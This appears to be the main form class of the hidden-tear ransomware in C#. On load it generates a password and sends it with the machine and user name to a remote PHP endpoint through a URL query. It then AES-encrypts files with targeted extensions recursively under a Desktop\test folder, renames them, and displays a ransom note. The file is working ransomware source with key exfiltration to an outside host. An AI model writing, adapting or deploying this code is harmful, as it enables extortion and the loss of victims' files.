using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using hidden_tear.Tools;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string targetURL = "https://www.example.com/hidden-tear/write.php?info=";


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            
            startAction();
            richTextBox1.Text = Config.note;
        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = true;
            Opacity = 100;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Sends created password target location
        public void SendPassword(string password){
            
            string info = Config.computerName + "-" + Config.userName + " " + password;
            var fullUrl = targetURL + info;
            var conent = new System.Net.WebClient().DownloadString(fullUrl);
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = Crypto.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+Tools.Config.encryptedExtension);

        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++){
                string extension = Path.GetExtension(files[i]);
                if (Tools.Config.extensionToEncrypt.Contains(extension))
                {
                    EncryptFile(files[i],password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++){
                encryptDirectory(childDirectories[i],password);
            }
            
            
        }

        public void startAction()
        {
            string password = CreatePassword(15);
            string path = "\\Desktop\\test";
            string startPath = Config.userDir + Config.userName + path;
            SendPassword(password);
            encryptDirectory(startPath,password);
            password = null;
            System.Windows.Forms.Application.Exit();
        }
    }
}
